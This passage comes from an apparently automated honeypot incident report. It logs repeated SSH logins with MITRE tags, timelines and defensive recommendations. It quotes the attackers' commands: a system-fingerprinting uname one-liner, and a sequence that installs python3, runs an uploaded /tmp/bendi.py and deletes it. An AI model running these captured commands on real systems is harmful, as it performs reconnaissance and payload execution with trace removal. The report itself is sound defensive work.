| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:46:37` | `cowrie.session.connect` |
| `2026-08-03 07:46:37` | `cowrie.client.version` |
| `2026-08-03 07:46:38` | `cowrie.client.kex` |
| `2026-08-03 07:46:38` | `cowrie.login.success` |
| `2026-08-03 07:46:39` | `cowrie.session.params` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.success` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.command.input` |
| `2026-08-03 07:46:39` | `cowrie.log.closed` |
| `2026-08-03 07:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f15dc85429b6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:48 |
| **Last Seen** | 2026-08-03 07:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:48:26` | `cowrie.session.connect` |
| `2026-08-03 07:48:26` | `cowrie.client.version` |
| `2026-08-03 07:48:26` | `cowrie.client.kex` |
| `2026-08-03 07:48:27` | `cowrie.login.success` |
| `2026-08-03 07:48:28` | `cowrie.session.params` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.success` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.command.input` |
| `2026-08-03 07:48:28` | `cowrie.log.closed` |
| `2026-08-03 07:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc40b7a4e99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:50 |
| **Last Seen** | 2026-08-03 07:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:50:13` | `cowrie.session.connect` |
| `2026-08-03 07:50:13` | `cowrie.client.version` |
| `2026-08-03 07:50:13` | `cowrie.client.kex` |
| `2026-08-03 07:50:14` | `cowrie.login.success` |
| `2026-08-03 07:50:15` | `cowrie.session.params` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.success` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.command.input` |
| `2026-08-03 07:50:15` | `cowrie.log.closed` |
| `2026-08-03 07:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e23cf60fa4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:52 |
| **Last Seen** | 2026-08-03 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:52:25` | `cowrie.session.connect` |
| `2026-08-03 07:52:25` | `cowrie.client.version` |
| `2026-08-03 07:52:25` | `cowrie.client.kex` |
| `2026-08-03 07:52:26` | `cowrie.login.success` |
| `2026-08-03 07:52:27` | `cowrie.session.params` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.success` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.command.input` |
| `2026-08-03 07:52:27` | `cowrie.log.closed` |
| `2026-08-03 07:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ace8433c50d

| Field | Detail |
|---|---|
| **Source IP** | `45.10.175[.]77` |
| **First Seen** | 2026-08-03 07:54 |
| **Last Seen** | 2026-08-03 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:54:29` | `cowrie.session.connect` |
| `2026-08-03 07:54:29` | `cowrie.client.version` |
| `2026-08-03 07:54:29` | `cowrie.client.kex` |
| `2026-08-03 07:54:30` | `cowrie.login.success` |
| `2026-08-03 07:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.10.175[.]77` to AbuseIPDB if not already reported
- [ ] Block `45.10.175[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c97084c52c2c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:55 |
| **Last Seen** | 2026-08-03 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:55:42` | `cowrie.session.connect` |
| `2026-08-03 07:55:42` | `cowrie.client.version` |
| `2026-08-03 07:55:43` | `cowrie.client.kex` |
| `2026-08-03 07:55:43` | `cowrie.login.success` |
| `2026-08-03 07:55:44` | `cowrie.session.params` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.success` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.command.input` |
| `2026-08-03 07:55:44` | `cowrie.log.closed` |
| `2026-08-03 07:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a586781b8c05

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:57 |
| **Last Seen** | 2026-08-03 07:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:57:40` | `cowrie.session.connect` |
| `2026-08-03 07:57:40` | `cowrie.client.version` |
| `2026-08-03 07:57:40` | `cowrie.client.kex` |
| `2026-08-03 07:57:41` | `cowrie.login.success` |
| `2026-08-03 07:57:42` | `cowrie.session.params` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.success` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.command.input` |
| `2026-08-03 07:57:42` | `cowrie.log.closed` |
| `2026-08-03 07:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab23a86db4cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:59 |
| **Last Seen** | 2026-08-03 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:59:24` | `cowrie.session.connect` |
| `2026-08-03 07:59:24` | `cowrie.client.version` |
| `2026-08-03 07:59:24` | `cowrie.client.kex` |
| `2026-08-03 07:59:26` | `cowrie.login.success` |
| `2026-08-03 07:59:28` | `cowrie.session.params` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.success` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.command.input` |
| `2026-08-03 07:59:28` | `cowrie.log.closed` |
| `2026-08-03 07:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7602e0080443

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:01 |
| **Last Seen** | 2026-08-03 08:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:01:09` | `cowrie.session.connect` |
| `2026-08-03 08:01:09` | `cowrie.client.version` |
| `2026-08-03 08:01:09` | `cowrie.client.kex` |
| `2026-08-03 08:01:10` | `cowrie.login.success` |
| `2026-08-03 08:01:11` | `cowrie.session.params` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.success` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.command.input` |
| `2026-08-03 08:01:11` | `cowrie.log.closed` |
| `2026-08-03 08:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1a5541ecce

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-03 08:01 |
| **Last Seen** | 2026-08-03 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:01:14` | `cowrie.session.connect` |
| `2026-08-03 08:01:14` | `cowrie.client.version` |
| `2026-08-03 08:01:14` | `cowrie.client.kex` |
| `2026-08-03 08:01:15` | `cowrie.login.success` |
| `2026-08-03 08:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca4170d75d82

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-03 08:01 |
| **Last Seen** | 2026-08-03 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:01:17` | `cowrie.session.connect` |
| `2026-08-03 08:01:17` | `cowrie.client.version` |
| `2026-08-03 08:01:17` | `cowrie.client.kex` |
| `2026-08-03 08:01:18` | `cowrie.login.success` |
| `2026-08-03 08:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe9124c9769

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-03 08:01 |
| **Last Seen** | 2026-08-03 08:03 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:01:39` | `cowrie.session.connect` |
| `2026-08-03 08:01:39` | `cowrie.client.version` |
| `2026-08-03 08:01:39` | `cowrie.client.kex` |
| `2026-08-03 08:01:40` | `cowrie.login.success` |
| `2026-08-03 08:01:42` | `cowrie.session.file_upload` |
| `2026-08-03 08:01:43` | `cowrie.session.params` |
| `2026-08-03 08:01:43` | `cowrie.command.input` |
| `2026-08-03 08:01:43` | `cowrie.command.input` |
| `2026-08-03 08:01:43` | `cowrie.command.input` |
| `2026-08-03 08:01:43` | `cowrie.command.failed` |
| `2026-08-03 08:01:43` | `cowrie.log.closed` |
| `2026-08-03 08:01:44` | `cowrie.session.params` |
| `2026-08-03 08:01:44` | `cowrie.command.input` |
| `2026-08-03 08:01:44` | `cowrie.log.closed` |
| `2026-08-03 08:01:45` | `cowrie.session.params` |
| `2026-08-03 08:01:45` | `cowrie.command.input` |
| `2026-08-03 08:01:45` | `cowrie.log.closed` |
| `2026-08-03 08:01:46` | `cowrie.session.params` |
| `2026-08-03 08:01:46` | `cowrie.command.input` |
| `2026-08-03 08:01:46` | `cowrie.command.failed` |
| `2026-08-03 08:01:46` | `cowrie.command.failed` |
| `2026-08-03 08:02:48` | `cowrie.session.params` |
| `2026-08-03 08:02:48` | `cowrie.command.input` |
| `2026-08-03 08:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82fae29840d0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:02 |
| **Last Seen** | 2026-08-03 08:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:02:58` | `cowrie.session.connect` |
| `2026-08-03 08:02:58` | `cowrie.client.version` |
| `2026-08-03 08:02:58` | `cowrie.client.kex` |
| `2026-08-03 08:02:59` | `cowrie.login.success` |
| `2026-08-03 08:03:01` | `cowrie.session.params` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.success` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.command.input` |
| `2026-08-03 08:03:01` | `cowrie.log.closed` |
| `2026-08-03 08:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f8036a63920

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-03 08:04 |
| **Last Seen** | 2026-08-03 08:06 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:04:04` | `cowrie.session.connect` |
| `2026-08-03 08:04:04` | `cowrie.client.version` |
| `2026-08-03 08:04:04` | `cowrie.client.kex` |
| `2026-08-03 08:04:05` | `cowrie.login.success` |
| `2026-08-03 08:04:07` | `cowrie.session.file_upload` |
| `2026-08-03 08:04:08` | `cowrie.session.params` |
| `2026-08-03 08:04:08` | `cowrie.command.input` |
| `2026-08-03 08:04:08` | `cowrie.command.input` |
| `2026-08-03 08:04:08` | `cowrie.command.input` |
| `2026-08-03 08:04:08` | `cowrie.command.failed` |
| `2026-08-03 08:04:08` | `cowrie.log.closed` |
| `2026-08-03 08:04:09` | `cowrie.session.params` |
| `2026-08-03 08:04:09` | `cowrie.command.input` |
| `2026-08-03 08:04:09` | `cowrie.log.closed` |
| `2026-08-03 08:04:10` | `cowrie.session.params` |
| `2026-08-03 08:04:10` | `cowrie.command.input` |
| `2026-08-03 08:04:11` | `cowrie.log.closed` |
| `2026-08-03 08:04:12` | `cowrie.session.params` |
| `2026-08-03 08:04:12` | `cowrie.command.input` |
| `2026-08-03 08:04:12` | `cowrie.command.failed` |
| `2026-08-03 08:04:12` | `cowrie.command.failed` |
| `2026-08-03 08:05:13` | `cowrie.session.params` |
| `2026-08-03 08:05:13` | `cowrie.command.input` |
| `2026-08-03 08:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5672fc72c1fd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:04 |
| **Last Seen** | 2026-08-03 08:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
